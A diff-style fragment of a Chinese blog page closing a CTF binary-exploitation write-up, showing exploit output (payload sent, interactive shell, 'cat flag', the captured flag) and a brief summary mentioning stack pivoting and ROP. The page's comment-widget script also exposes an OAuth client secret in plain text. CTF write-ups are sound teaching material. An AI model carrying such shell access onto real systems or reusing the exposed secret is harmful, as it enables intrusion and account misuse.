class="line">[+]sending payload </span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Tell me:</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">bin</span><br><span class="line"></span><br><span class="line">dev</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">lib</span><br><span class="line"></span><br><span class="line">lib32</span><br><span class="line"></span><br><span class="line">lib64</span><br><span class="line"></span><br><span class="line">pwn</span><br><span class="line"></span><br><span class="line">run.sh</span><br><span class="line"></span><br><span class="line">$ cat flag</span><br><span class="line"></span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;1f8e093b45bbb8f4b14478b253&#125;</span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/10/MKyRnU.png" alt="img"></p>
+<p>小结：</p>
+<p>这应该算是一道简单题，没有涉及到很复杂到利用知识。不过单纯看逆向还是非常花时间的，和真实环境到漏洞比较类似，漏洞点不是很好找。后来利用时，栈翻转是基操，使用ROP是基操，但是尝试用ROP来呼叫中断，尝试了很多次都没有成功。CTF比赛还是需要一些脑洞。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/11/12/Three-Write/" data-id="ck4pciqn70012vx2s5nym9nu4"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/11/20/2019-11-20/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            二零一九 十一月 二十日 凌晨
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">IE8的一个释放后重用(UAF)</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Migraine</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
